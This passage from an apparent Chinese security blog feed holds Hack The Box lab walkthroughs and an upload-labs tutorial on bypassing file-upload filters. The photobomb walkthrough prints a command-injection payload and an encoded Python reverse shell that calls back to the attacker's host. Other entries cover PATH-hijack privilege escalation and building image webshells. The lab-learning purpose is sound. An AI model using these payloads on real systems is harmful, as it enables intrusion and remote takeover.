escalation"></a>privilege escalation</h2><p>从本地使用wget下载linpeas到靶机上，加执行权限运行：</p><p><img src="/2023/04/27/file-upload/e-20230502225620044.png" alt="image-20230502225620044"></p><p>这里标注出，python3.8，有cap_setuid权限。</p><p>gtfobins网站搜索：</p><p><img src="/2023/04/27/file-upload/e-20230502225710519.png" alt="image-20230502225710519"></p><p>尝试执行：</p><p><img src="/2023/04/27/file-upload/e-20230502225740390.png" alt="image-20230502225740390"></p><p>成功提权到root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_legacy</title>
    <link href="/2023/05/01/htb-legacy/"/>
    <url>/2023/05/01/htb-legacy/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-legacy"><a href="#htb-legacy" class="headerlink" title="htb_legacy"></a>htb_legacy</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/mage-20230501142850551.png" alt="image-20230501142850551"></p><p>扫服务：</p><p><img src="/2023/04/27/file-upload/mage-20230501142914119.png" alt="image-20230501142914119"></p><p>开放135，139，445端口，考虑ms17010，先用nmap进行漏洞扫描：</p><p><code>nmap -sC -sV -A -p 135,139,445 --script vuln 10.10.10.4</code></p><p><img src="/2023/04/27/file-upload/mage-20230501143008849.png" alt="image-20230501143008849"></p><p>ms08-067 vulnerable。</p><p>msf：</p><p><img src="/2023/04/27/file-upload/mage-20230501143055349.png" alt="image-20230501143055349"></p><p>getshell，system权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_lame</title>
    <link href="/2023/05/01/htb-lame/"/>
    <url>/2023/05/01/htb-lame/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-lame"><a href="#htb-lame" class="headerlink" title="htb_lame"></a>htb_lame</h1><p>nmap扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501211833742.png" alt="image-20230501211833742"></p><p>服务探测：</p><p><img src="/2023/04/27/file-upload/ge-20230501211850783.png" alt="image-20230501211850783"></p><p>漏洞扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501211911579.png" alt="image-20230501211911579"></p><p>没有直接发现可利用漏洞。</p><p>使用searchsploit搜索相关漏洞：</p><p><img src="/2023/04/27/file-upload/ge-20230501212032502.png" alt="image-20230501212032502"></p><p>首先是vsftpd，找到一个后门，尝试后无果，跳过。</p><p>接下来是samba：</p><p><img src="/2023/04/27/file-upload/ge-20230501212113153.png" alt="image-20230501212113153"></p><p>发现命令注入漏洞，但是在msf模块中，尽量避免使用msf：</p><p><img src="/2023/04/27/file-upload/ge-20230501212313179.png" alt="image-20230501212313179"></p><p>直接查看rb脚本，发现CVE-2007-2447。</p><p>github搜索并git clone exp：</p><p><img src="/2023/04/27/file-upload/ge-20230501212415484.png" alt="image-20230501212415484"></p><p><img src="/2023/04/27/file-upload/ge-20230501212444089.png" alt="image-20230501212444089"></p><p>本地起监听，攻击成功，root权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_jerry</title>
    <link href="/2023/05/01/htb-jerry/"/>
    <url>/2023/05/01/htb-jerry/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-jerry"><a href="#htb-jerry" class="headerlink" title="htb_jerry"></a>htb_jerry</h1><p>nmap先端口扫描：</p><p><img src="/2023/04/27/file-upload/age-20230501213312119.png" alt="image-20230501213312119"></p><p>8080的http服务，firefox访问看看：</p><p><img src="/2023/04/27/file-upload/age-20230501213335521.png" alt="image-20230501213335521"></p><p>tomcat。使用tomcat字典进行目录爆破，先查找tomcat字典：</p><p><img src="/2023/04/27/file-upload/age-20230501213409061.png" alt="image-20230501213409061"></p><p>爆破：</p><p><img src="/2023/04/27/file-upload/age-20230501213425390.png" alt="image-20230501213425390"></p><p>访问之后，发现只有manager可利用，为登录页面：</p><p><img src="/2023/04/27/file-upload/age-20230501213449833.png" alt="image-20230501213449833"></p><p>tomcat&#x2F;tomcat登录失败。此时点击cancel：</p><p><img src="/2023/04/27/file-upload/age-20230501213512808.png" alt="image-20230501213512808"></p><p>返回401页面，并包含了tomcat&#x2F;s3cret的一组账号密码：</p><p><img src="/2023/04/27/file-upload/age-20230501213556528.png" alt="image-20230501213556528"></p><p>成功登录。</p><p>接下来就是上传war来getshell：</p><p><img src="/2023/04/27/file-upload/age-20230501214307244.png" alt="image-20230501214307244"></p><p>msfvenom生成war格式的马，上传：</p><p><img src="/2023/04/27/file-upload/age-20230501214326514.png" alt="image-20230501214326514"></p><p>上传成功，msf中开监听，点击&#x2F;shell即可上线：</p><p><img src="/2023/04/27/file-upload/age-20230501214524229.png" alt="image-20230501214524229"></p><p>查看whoami，system权限：</p><p><img src="/2023/04/27/file-upload/age-20230501214538005.png" alt="image-20230501214538005"></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_blue</title>
    <link href="/2023/05/01/htb-blue/"/>
    <url>/2023/05/01/htb-blue/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-blue"><a href="#htb-blue" class="headerlink" title="htb_blue"></a>htb_blue</h1><p>nmap端口扫描：</p><p><img src="/2023/04/27/file-upload/ge-20230501102723572.png" alt="image-20230501102723572"></p><p>扫具体服务：</p><p><img src="/2023/04/27/file-upload/ge-20230501102743582.png" alt="image-20230501102743582"></p><p>win7&#x2F;win2008，开放了139，445端口，ms17-010：</p><p><img src="/2023/04/27/file-upload/ge-20230501102958871.png" alt="image-20230501102958871"></p><p>getshell，system权限。</p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_photobomb</title>
    <link href="/2023/04/28/htb-photobomb/"/>
    <url>/2023/04/28/htb-photobomb/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-photobomb"><a href="#htb-photobomb" class="headerlink" title="htb_photobomb"></a>htb_photobomb</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先使用nmap简单扫一下端口：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125553727.png" alt="image-20230428125553727"></p><p>加上参数扫服务：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125623120.png" alt="image-20230428125623120"></p><p>火狐访问http服务，dns解析出错：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125831914.png" alt="image-20230428125831914"></p><p>域名加到hosts文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125940041.png" alt="image-20230428125940041"></p><p>成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428125955771.png" alt="image-20230428125955771"></p><p>to get started, please click here,点击超链：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130205321.png" alt="image-20230428130205321"></p><p>弹出一个登录框，无法抓取流量，应该是前端校验。</p><p>尝试目录爆破：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130417051.png" alt="image-20230428130417051"></p><p>也没有可利用内容。</p><p>查看源代码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130456002.png" alt="image-20230428130456002"></p><p>出现可疑js文件，photobomb.js:</p><p><img src="/2023/04/27/file-upload/b/image-20230428130526194.png" alt="image-20230428130526194"></p><p><code>http://pH0t0:b0Mb!@photobomb.htb/printer</code>尝试用此处的pH0t0:b0Mb!作为用户密码进行登录：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130702335.png" alt="image-20230428130702335"></p><p>登录成功。</p><p>页面有下载图片功能，用burp查看具体流量：</p><p><img src="/2023/04/27/file-upload/b/image-20230428130947611.png" alt="image-20230428130947611"></p><p>对photo，filetype等参数测试sql漏洞无果，尝试命令拼接rce。</p><p>首先本地开启http-server：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131139256.png" alt="image-20230428131139256"></p><p><img src="/2023/04/27/file-upload/b/image-20230428131041281.png" alt="image-20230428131041281"></p><p>修改photo参数，输入命令<code>;curl 10.10.16.2</code>，使用ctrl+u，对命令进行编码，空格自动替换为+，发送请求后无响应。</p><p>接下来尝试filetype参数：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131530670.png" alt="image-20230428131530670"></p><p>本地成功接受到curl请求，可以判断存在命令注入：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131517217.png" alt="image-20230428131517217"></p><p>接下来直接反弹shell：</p><p><code>;export+RHOST=&quot;10.10.16.2&quot;;export+RPORT=4444;python3+-c+&#39;import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>同样需要ctrl+u编码：</p><p><img src="/2023/04/27/file-upload/b/image-20230428131733399.png" alt="image-20230428131733399"></p><p>成功接收到shell。</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>在home下发现user.txt：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132024695.png" alt="image-20230428132024695"></p><p>尝试sudo提权：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132100862.png" alt="image-20230428132100862"></p><p>可以用root权限执行&#x2F;opt&#x2F;cleanup.sh，通过crontab也发现该文件：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132201958.png" alt="image-20230428132201958"></p><p>查看cleanup.sh:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132227028.png" alt="image-20230428132227028"></p><p>注意最后一行，用到了find命令，但是没有使用绝对路径，因此通过路径劫持提权，步骤如下：</p><ul><li>新建一个find文件，通过find文件获取root shell</li><li>更改环境变量，使得sudo运行cleanup.sh时首先使用新建的find</li></ul><p>首先新建find文件，内容为”&#x2F;bin&#x2F;bash”:</p><p><img src="/2023/04/27/file-upload/b/image-20230428132623018.png" alt="image-20230428132623018"></p><p>&#x2F;opt目录不可写，因此写到&#x2F;tmp目录下。</p><p>赋予执行权限：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132708609.png" alt="image-20230428132708609"></p><p>接下来更改环境变量，sudo执行：</p><p><img src="/2023/04/27/file-upload/b/image-20230428132751987.png" alt="image-20230428132751987"></p><p>执行后依然是wizard权限，未获得root权限的shell。</p><p>重新执行<code>sudo PATH=/TMP:$PATH /opt/cleanup.sh</code>后，提权成功：</p><p><img src="/2023/04/27/file-upload/b/image-20230428133006076.png" alt="image-20230428133006076"></p><p>因为<strong>使用sudo执行一条命令时，会起一个新的shell，因此需要在sudo命令后更改环境变量！</strong></p>]]></content>
    
    
    <categories>
      
      <category>htb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>walkthrough</tag>
      
      <tag>htb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>file_upload</title>
    <link href="/2023/04/27/file-upload/"/>
    <url>/2023/04/27/file-upload/</url>
    
    <content type="html"><![CDATA[<h1 id="file-upload"><a href="#file-upload" class="headerlink" title="file_upload"></a>file_upload</h1><p><img src="/2023/04/27/file-upload/19475290.jpg" alt="image-20240723152418622"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>简单来说，存在文件上传，就可能存在文件上传漏洞。上传文件时，如果未对上传的文件进行严格的验证和过滤，就可能导致传入非法文件，例如木马等等。</p><h3 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h3><p>上传漏洞与SQL注入或 XSS相比，其风险更大。</p><p>如果 Web应用程序存在上传漏洞，攻击者上传的文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，就会导致代码执行。如果上传的文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为。如果上传的文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。甚至攻击者可以直接上传一个webshell到服务器上完全控制系统。</p><h3 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h3><ul><li><p>fofa等引擎搜索。例如inurl:upload.php.</p></li><li><p>黑盒。使用敏感目录扫描工具查找:御剑后台扫描工具，dirsearch等等。</p></li><li><p>白盒。找对cms，看源码。</p></li><li><p>后台查找。进入后台之后并不能获得网站权限，只是后台权限，可以通过登录后台进行文件上传从而获得整个网站的权限。</p></li><li><p>会员中心，个人资料等模块查找。</p></li></ul><p>找到上传点之后，是否具有上传漏洞，具体情况需要结合抓包情况查看。</p><h3 id="upload-labs靶场介绍"><a href="#upload-labs靶场介绍" class="headerlink" title="upload-labs靶场介绍"></a>upload-labs靶场介绍</h3><p><img src="/2023/04/27/file-upload/dlabs.png" alt="image-20211025002900015"></p><p>upload-labs是一个使用php语言编写的，专门收集渗透测试过程中遇到的各种上传漏洞的靶场。提供了文件上传的各种不同环境，用以进行原理的学习。</p><p>项目地址:<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>本文档主要介绍文件上传部分内容，靶场搭建等部分不进行详细讲解，可以参考：<a href="https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163509252516780271586181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&utm_term=uploadlabs%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_32448559/article/details/81667309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163509252516780271586181%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163509252516780271586181&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-81667309.first_rank_v2_pc_rank_v29&amp;utm_term=uploadlabs%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187</a></p><h3 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h3><ul><li>格式</li></ul><p>正常情况下，如果将php木马上传到网站，但格式为jpg格式，一般是无法成功进行利用的（无解析漏洞）。需要注意网站所使用的语言以及上传文件的格式类型。</p><ul><li>分类</li></ul><p>对于文件上传漏洞，需要注意的是清楚地把握住出现漏洞的点。例如是编辑器漏洞，还是第三方应用漏洞，或者是代码的逻辑中存在漏洞。针对不同的漏洞，应该采用更有针对性的方法。在下文会对不同的分类具体展开。</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><h4 id="js类防护"><a href="#js类防护" class="headerlink" title="js类防护"></a>js类防护</h4><p><strong>Pass-01</strong></p><ul><li>靶场环境中，可以直接删除js过滤代码</li><li>真实环境中可以考虑浏览器禁用js（可能会导致正常功能无法使用，不推荐）</li></ul><p>浏览器禁用javascript方法（Firefox为例）：</p><p>搜索栏中输入about:config，确定之后搜索javascript.enabled,点击切换即可禁用js脚本</p><p><img src="/2023/04/27/file-upload/ox.png" alt="image-20211025135825125"></p><p>Tips:有时候上传文件使用burp抓包无法捕获到流量，可能就是因为采用了本地js的验证方法。</p><p><strong>防护措施</strong></p><p>尽量使用后端验证</p><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>文件上传的后端验证主要有后缀名，文件类型和文件头等等。其中后缀名主要使用黑白名单进行验证，文件类型主要通过MIME信息验证，而文件头一般通过内容头进行校验。</p><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>黑名单验证是指只要后缀名不在给定的数组中，就不会被拦截，可以进行上传。常见的黑名单有asp,php,jsp,aspx,cgi,war等等。一般可以通过如下几种方式绕过：</p><h5 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h5><p><strong>Pass-03</strong></p><p>首先查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025145816144"></p><p>典型的黑名单过滤，上传php文件，上传失败：</p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025144503909"></p><p>以最常用的php为例，如果黑名单中只有.php后缀，可以通过php3,php5,phtml等未被过滤的后缀名进行绕过，上传.php5进行测试：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025150600496"></p><p>上传成功。</p><p>对于该绕过方法，在Apache服务器中，可以通过更改Apache httpd.conf配置文件，添加.php3 和.phtml，并且取消注释，来实现对php3,phtml等文件的解析。</p><p><img src="/2023/04/27/file-upload/e.png" alt="image-20211025150142567"></p><p><strong>防护措施</strong></p><p>拓展黑名单的内容，并且对服务器配置进行严格限制，即使文件上传也无法解析</p><h5 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h5><p>.htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>Tips:只有Apache才可以</p><p><strong>Pass-04</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025163819926"></p><p>可以看出，这里也是使用了黑名单的方式进行过滤。但是.htaccess并不在黑名单中，因此首先上传.htaccess文件：</p><p><img src="/2023/04/27/file-upload/ess.png" alt="image-20211025152331749"></p><p>这里.htaccess文件的意义是将后续上传的文件，当作php来进行解析。</p><p>Tips:</p><ul><li>如果上传的内容如上图所示，那么后续上传的文件名或后缀名中需要包含有info，也就是双引号中的值。</li><li>如果文件的内容为<code>setHandler application/x-httpd-php</code>，那么，任意形式的文件都会被当作php解析。</li><li>文件名后缀命名时记得绕开黑名单中的后缀名。</li><li>上传的.htaccess文件，通过记事本可能无法保存，可以通过burp修改文件名或者使用Notepad++保存文件。</li></ul><p>接下来对上传的info.abc进行测试：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025164521803"></p><p>上传成功，查看phpinfo:</p><p><img src="/2023/04/27/file-upload/info.png" alt="image-20211025164609493"></p><p>成功解析成php文件。</p><p><strong>防护措施</strong></p><p>禁止上传.htaccess文件，可以通过snort对filename的内容进行检测</p><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p><strong>Pass-05</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025164929968"></p><p>使用黑名单进行过滤，这里直接使用大小写绕过：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025165114713"></p><p>成功上传php文件。</p><p><strong>防护措施</strong></p><p>拓展黑名单内容</p><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p><strong>Pass-06</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025165335192"></p><p>发现这里没有使用trim()函数，也就是没有对空格进行过滤。因此尝试使用空格绕过：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025165548554"></p><p>使用burp在filename内容最后加上空格，绕过黑名单验证，成功上传。</p><p>Tips:</p><ul><li>必须抓包后在最后添加空格，如果直接在本地文件后缀加空格会被自动删除。</li><li>抓包添加空格之后，会绕过黑名单的验证，但是保存到服务器之后，文件最后的空格还是会被删除，最终还是php文件。</li></ul><p><strong>防护措施</strong></p><p>拓展黑名单，或者使用函数删除文件名末尾的空格再进行过滤。</p><p>也可写规则对空格0d0a进行匹配。</p><h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p><strong>Pass-07</strong></p><p>源码如下：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025170004591"></p><p>这里少了deldot()函数，即删除文件名末尾的点。</p><p>这里思路和空格绕过相同，但是同样需要注意只能通过抓包修改，直接在本地修改会默认删除最后的点，抓包添加点之后会绕过黑名单，但是保存到服务器之后同样最后的点会被删除，还是原来的文件格式：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025170344273"></p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025170445942"></p><p>到上传目录查看，还是原理的php格式，并能成功解析。</p><p><strong>防护措施</strong></p><p>使用函数先删除文件名末尾的.再进行过滤。</p><p>写规则对点0d0a进行匹配。</p><h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h5><p><strong>Pass-08</strong></p><p>审计源码发现，没有使用stri_replace函数替换字符串::$DATA。</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025170728809"></p><p>在windows下，如果文件名+”::$DATA”，系统会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。例如:phpinfo.php::$DATA，Windows会自动去掉末尾的::$DATA变成phpinfo.php。利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025170934067"></p><p>上传成功。</p><p><strong>防护措施</strong></p><p>先删除文件名末尾的::$DATA再过滤操作</p><p>对filename中的::$DATA进行匹配（已经添加规则）</p><h5 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a>点加空格加点绕过</h5><p><strong>Pass-09</strong></p><p>审计源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025171317917"></p><p>这里首先会去除空格，接着删除文件名末尾的点，最后再去空。</p><p>因为最后会去空，因此文件名结尾不能为空格，可以结合点绕过进行考虑。文件名末尾为点，删除空格就加上空格，开始还会删除一个点，因此再加上点，也就是<code>. .</code>，测试：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025172046926"></p><p>成功绕过过滤，上传文件。</p><p><strong>防护措施</strong></p><p>删除文件名末尾的点，空格再过滤</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p><strong>Pass-10</strong></p><p>源码：</p><p><img src="/2023/04/27/file-upload/0code.png" alt="image-20211025172233670"></p><p>这里直接上传文件，成功：</p><p><img src="/2023/04/27/file-upload/0t.png" alt="image-20211025172429960"></p><p>到对应目录下查看，发现文件为：</p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025172515208"></p><p>文件格式不对是无法进行解析的。本关中过滤思路为直接删除黑名单中的后缀名，因此双写进行绕过：</p><p><img src="/2023/04/27/file-upload/0s.png" alt="image-20211025172629452"></p><p>文件格式为php，可以正常解析。</p><p><strong>防护措施</strong></p><p>对文件名的过滤使用循环过滤来替代单次过滤</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>白名单验证是指只有后缀名在给定的数组中，才不会被拦截，可以进行上传。较黑名单而言，白名单验证往往更为安全。但是也有如下几类绕过方式：</p><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p><strong>Pass-02</strong></p><p>查看源码：</p><p><img src="/2023/04/27/file-upload/code.png" alt="image-20211025143831680"></p><p>先简单介绍一下$FILES函数：<br>$_FILES[myFile] [name]:客户端文件的原名称</p><p>$_FILES[myFile] [type]:文件的MIME类型</p><p>$_FILES[myFile] [size]:上传文件的大小，单位为字节</p><p>$_FILES[myFile] [tmp_name]:文件被上传后在服务端存储的临时文件名</p><p>$_FILES[myFile] [error]:和该文件上传相关的错误代码</p><p>通过源码可以发现，这里通过对MIME类型的验证进行过滤。上传文件测试：</p><p><img src="/2023/04/27/file-upload/png" alt="image-20211025144503909"></p><p>上传失败，抓包查看：</p><p><img src="/2023/04/27/file-upload/p.png" alt="image-20211025144604979"></p><p>对content-type内容进行修改：</p><p><img src="/2023/04/27/file-upload/s.png" alt="image-20211025144748487"></p><p>上传成功。</p><p>因此，单纯通过对MIME类型进行验证是很不安全的。</p><p><strong>防护措施</strong></p><p>对MIME,后缀名进行匹配验证。</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p><strong>Pass-11</strong></p><p>这里的%00截断需要与后面的00截断区分开。%00截断主要使用在地址中。</p><p>首先查看源码：</p><p><img src="/2023/04/27/file-upload/1code.png" alt="image-20211025175804899"></p><p>非常典型的白名单过滤。首先抓包：</p><p><img src="/2023/04/27/file-upload/1f.png" alt="image-20211025175934766"></p><p>这里发现url中带有参数save_path.结合源码发现，本关的文件，上传之后，保存到file_upload_path中，而file_upload_path由save_path,随机数和日期拼接而成。例如save_path为..&#x2F;upload，那么保存的路径就是..&#x2F;upload&#x2F;6620211025.jpg（jpg是上传的文件的后缀）。此处利用%00对后续内容进行截断，例如save_path为..&#x2F;upload&#x2F;a.php%00，正常来说保存路径应该是..&#x2F;upload&#x2F;a.php%006620211025.jpg，但是%00会将后面的随机数及日期部分丢弃，直接保存为a.php，测试：</p><p><img src="/2023/04/27/file-upload/1s.png" alt="image-20211025180435295"></p><p>上传成功。</p><p>Tips:此处的文件名后缀，一定要在白名单中，不然会被拦截，即使后缀为jpg，但是截断时保存为php，依然能够被解析：</p><p><img src="/2023/04/27/file-upload/1info.png" alt="image-20211025180635064"></p><p><strong>防护措施</strong></p><p>对url中的00进行匹配（已添加规则）</p><h5 id="00截断-1"><a href="#00截断-1" class="headerlink" title="00截断"></a>00截断</h5><p><strong>Pass-12</strong></p><p>源码：</p><p><img src="/2023/04/27/file-upload/2code.png" alt="image-20211025205040477"></p><p>这里的提交方式由get变成了post，同样修改save_path参数的值。</p><p>注意：00截断与前文的%00截断的区别在于，%00截断主要用于地址，例如上一关所示的文件上传地址，并且get方法会自动解码%00，因此直接输入%00即可，但是post方法不会，因此需要先将其编码才能实现截断的效果。</p><p><img src="/2023/04/27/file-upload/2en.png" alt="image-20211025211523737"></p><p>上传的文件名后缀为白名单中的jpg，MIME格式无需修改，将save_path加上hahaha.php%00，再使用编码功能对%00进行编码，最后发送数据包，上传成功：</p><p><img src="/2023/04/27/file-upload/2s.png" alt="image-20211025211121816"></p><p>文件名为我们修改的hahaha.php，并能成功解析：</p><p><img src="/2023/04/27/file-upload/2info.png" alt="image-20211025211716502"></p><p><strong>防护措施</strong></p><p>对post参数的内容进行00匹配</p><h4 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h4><h5 id="上传图片马配合文件包含漏洞"><a href="#上传图片马配合文件包含漏洞" class="headerlink" title="上传图片马配合文件包含漏洞"></a>上传图片马配合文件包含漏洞</h5><p>上传图片马可以用来突破getimagesize，exif_imagetype等函数，就不一一举例，原理和方法都相同，接下来以Pass-13进行说明。</p><p><strong>Pass-13</strong></p><p>图片马是指将木马插入到图片中，并且不影响图片的正常显示。</p><p>图片马的制作一般有如下几种方法：</p><ul><li>以文本方式打开图片</li></ul><p>在文件末尾直接写一句话木马。</p><ul><li>使用cmd制作木马</li></ul><p>copy aaa.jpg &#x2F;b + trojan.php &#x2F;a webshell.jpg。其中&#x2F;b是二进制形式打开，&#x2F;a是ascii方式打开，webshell.jpg是生成的图片马。这里最好把图片文件放在前面，如果反过来，不会影响效果，但是会让木马脚本出现在文件的开头，更容易被检测到。</p><ul><li>16进制打开图片插入木马</li></ul><p>使用winhex等工具打开， 在文件尾插入一句话木马。</p><ul><li>使用PS</li></ul><p>打开文件-&gt;文件简介，在标题处写入木马：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20211025214635884"></p><p>这里就使用cmd制作木马，生成webshell.jpg，上传成功：</p><p><img src="/2023/04/27/file-upload/3up.png" alt="image-20211025214745607"></p><p>接下来结合文件包含漏洞，执行php代码。</p><p>右键图片复制地址，并打开文件包含漏洞页面，将地址传给file参数，成功以jpg格式执行phpinfo():</p><p><img src="/2023/04/27/file-upload/3s.png" alt="image-20211025214919172"></p><p><strong>防护措施</strong></p><p>在文件内容中搜索特征字符串例如&lt;?php等，对其进行匹配</p><h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p><strong>Pass-17</strong></p><p>源码如下 ：</p><p><img src="/2023/04/27/file-upload/7code.png" alt="image-20211025220038872"></p><p>为了将用户提交的图片进行尺寸上的更改或者适应某些内容，有时会进行二次渲染。</p><p>审计这里的代码，可以发现存在逻辑问题。首先没有进行验证，就将文件直接上传，随后将temp_file移动到upload_file，再将upload_file重命名为file_upload_path. 但是其实在开始，文件已经成功上传到了服务器，只是被重命名了无法发现，接下来进行测试：</p><p><img src="/2023/04/27/file-upload/7rename.png" alt="image-20211025221931927"></p><p>将rename直接注释掉，上传文件：</p><p><img src="/2023/04/27/file-upload/ell.png" alt="image-20211025222114342"></p><p>可以发现文件已经被上传到了服务器。结合条件竞争的利用在下面具体讲解。</p><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" 